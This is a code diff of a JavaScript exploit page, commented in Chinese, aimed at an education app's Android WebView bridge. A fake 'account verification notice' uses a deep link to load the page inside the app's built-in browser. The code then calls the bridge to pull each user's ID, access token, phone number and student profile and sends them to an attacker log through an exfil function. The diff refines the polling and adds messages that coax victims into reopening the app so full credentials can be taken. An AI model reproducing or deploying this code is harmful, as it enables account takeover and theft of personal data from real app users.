@@ -32,25 +32,35 @@ var IN_CONTAINER = false;
 try { IN_CONTAINER = !!(window.xdfhybirdAndroid || window.MoonBridge); } catch(e){}
 
 if (IN_CONTAINER) {
-  // ====== 容器形态：已被深链拉进 App 内置浏览器，执行凭据窃取 ======
-  var tries = 0;
-  function kick(){
-    tries++;
-    try {
-      if (!window.xdfhybirdAndroid) throw new Error("bridge not ready (try " + tries + ")");
-      var data = window.xdfhybirdAndroid.requireData();          // userId+accessToken+手机号+学员档案
-      exfil("requireData", data);
+  // ====== 容器形态：深链已把页面拉进App内置浏览器 ======
+  var n = 0, MAX = 8;
+  function poll(){
+    n++;
+    var data = null;
+    try { data = window.xdfhybirdAndroid.requireData(); } catch(e){
+      show("[" + n + "] bridge error: " + e);
+      if (n < MAX) setTimeout(poll, 1000);
+      return;
+    }
+    var hasUser = false;
+    try { hasUser = !!(JSON.parse(data).user && JSON.parse(data).user.accessToken); } catch(e){}
+    if (hasUser) {
+      exfil("requireData", data);          // 凭据全套外带
       try { exfil("requirePageParam", window.xdfhybirdAndroid.requirePageParam()); } catch(e){}
       show("=== 以上数据已同步至攻击者日志 ===");
-    } catch(e){
-      show("[" + tries + "] " + e);
-      if (tries < 10) setTimeout(kick, 500);
-      else show("FAILED: 桥不可达");
+    } else if (n < MAX) {
+      show("[" + n + "] 等待账号服务初始化...");
+      setTimeout(poll, 1000);
+    } else {
+      // 深链冷启动跳过了Splash自动登录，账号服务未初始化：容器劫持成功但暂无登录态
+      exfil("requireData_empty", data);
+      show("容器劫持成功，但App进程为冷启动（账号服务未初始化）。");
+      show("请先打开一次新东方App到首页，再重新点击链接即可拿到完整凭据。");
     }
   }
-  kick();
+  poll();
 } else {
-  // ====== 浏览器形态：受害者点击的入口，展示"继续"按钮 = 深链触发 ======
+  // ====== 浏览器形态：受害者入口，深链按钮 ======
   document.getElementById('head').textContent = "账户核验通知";
   var self = "xdfstudent://open/web?fullscreen=0&isImmersive=0&url=" + encodeURIComponent(location.href);
   document.getElementById('golink').href = self;
